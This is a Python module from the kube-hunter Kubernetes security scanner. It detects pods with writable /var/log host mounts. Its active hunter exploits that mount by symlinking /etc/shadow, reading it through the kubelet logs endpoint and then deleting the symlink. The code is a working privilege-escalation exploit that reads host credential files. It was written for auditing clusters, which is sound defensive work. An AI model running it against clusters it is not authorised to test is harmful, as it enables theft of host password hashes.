import logging
import json
import uuid

from kube_hunter.core.events import handler
from kube_hunter.core.events.types import Event, Vulnerability
from kube_hunter.core.types import ActiveHunter, Hunter, KubernetesCluster, PrivilegeEscalation
from kube_hunter.modules.hunting.kubelet import ExposedPodsHandler, ExposedRunHandler, KubeletHandlers


class WriteMountToVarLog(Vulnerability, Event):
    """A pod can create symlinks in the /var/log directory on the host, which can lead to a root directory traveral"""
    def __init__(self, pods):
        Vulnerability.__init__(self, KubernetesCluster, "Pod With Mount To /var/log", category=PrivilegeEscalation, vid="KHV047")
        self.pods = pods
        self.evidence = "pods: {}".format(', '.join((pod["metadata"]["name"] for pod in self.pods)))


class DirectoryTraversalWithKubelet(Vulnerability, Event):
    """An attacker can run commands on pods with mount to /var/log, and traverse read all files on the host filesystem"""
    def __init__(self, output):
        Vulnerability.__init__(self, KubernetesCluster, "Root Traversal Read On The Kubelet", category=PrivilegeEscalation)
        self.output = output
        self.evidence = "output: {}".format(self.output)


@handler.subscribe(ExposedPodsHandler)
class VarLogMountHunter(Hunter):
    """Mount Hunter - /var/log
    Hunt pods that have write access to host's /var/log. in such case,
    the pod can traverse read files on the host machine
    """
    def __init__(self, event):
        self.event = event

    def has_write_mount_to(self, pod_data, path):
        """Returns volume for correlated writable mount"""
        for volume in pod_data["spec"]["volumes"]:
            if "hostPath" in volume:
                if "Directory" in volume["hostPath"]["type"]:
                    if volume["hostPath"]["path"].startswith(path):
                        return volume

    def execute(self):
        pe_pods = []
        for pod in self.event.pods:
            if self.has_write_mount_to(pod, path="/var/log"):
                pe_pods.append(pod)
        if pe_pods:
            self.publish_event(WriteMountToVarLog(pods=pe_pods))

@handler.subscribe(ExposedRunHandler)
class ProveVarLogMount(ActiveHunter):
    """Prove /var/log Mount Hunter
    Tries to read /etc/shadow on the host by running commands inside a pod with host mount to /var/log
    """
    def __init__(self, event):
        self.event = event
        self.base_path = "https://{host}:{port}/".format(host=self.event.host, port=self.event.port)

    def run(self, command, container):
        run_url = KubeletHandlers.RUN.value.format(
            podNamespace=container["namespace"],
            podID=container["pod"],
            containerName=container["name"],
            cmd=command
        )
        return self.event.session.post(self.base_path + run_url, verify=False).text

    # TODO: replace with multiple subscription to WriteMountToVarLog as well
    def get_varlog_mounters(self):
        logging.debug("accessing /pods manually on ProveVarLogMount")
        pods = json.loads(self.event.session.get(self.base_path + KubeletHandlers.PODS.value, verify=False).text)["items"]
        for pod in pods:
            volume = VarLogMountHunter(ExposedPodsHandler(pods=pods)).has_write_mount_to(pod, "/var/log")
            if volume:
                yield pod, volume

    def mount_path_from_mountname(self, pod, mount_name):
        """returns container name, and container mount path correlated to mount_name"""
        for container in pod["spec"]["containers"]:
            for volume_mount in container["volumeMounts"]:
                if volume_mount["name"] == mount_name:
                    logging.debug("yielding {}".format(container))
                    yield container, volume_mount["mountPath"]

    def traverse_read(self, host_file, container, mount_path, host_path):
        """Returns content of file on the host, and cleans trails"""
        symlink_name = str(uuid.uuid4())
        # creating symlink to file
        self.run("ln -s {} {}/{}".format(host_file, mount_path, symlink_name), container=container)
        # following symlink with kubelet
        path_in_logs_endpoint = KubeletHandlers.LOGS.value.format(path=host_path.strip('/var/log')+symlink_name)
        content = self.event.session.get("{}{}".format(self.base_path, path_in_logs_endpoint), verify=False).text
        # removing symlink
        self.run("rm {}/{}".format(mount_path, symlink_name), container=container)
        return content

    def execute(self):
        for pod, volume in self.get_varlog_mounters():
            for container, mount_path in self.mount_path_from_mountname(pod, volume["name"]):
                logging.debug("correleated container to mount_name")
                cont = {
                    "name": container["name"],
                    "pod": pod["metadata"]["name"],
                    "namespace": pod["metadata"]["namespace"],
                }
                try:
                    output = self.traverse_read("/etc/shadow", container=cont, mount_path=mount_path, host_path=volume["hostPath"]["path"])
                    self.publish_event(DirectoryTraversalWithKubelet(output=output))
                except Exception as x:
                    logging.debug("could not exploit /var/log: {}".format(x))
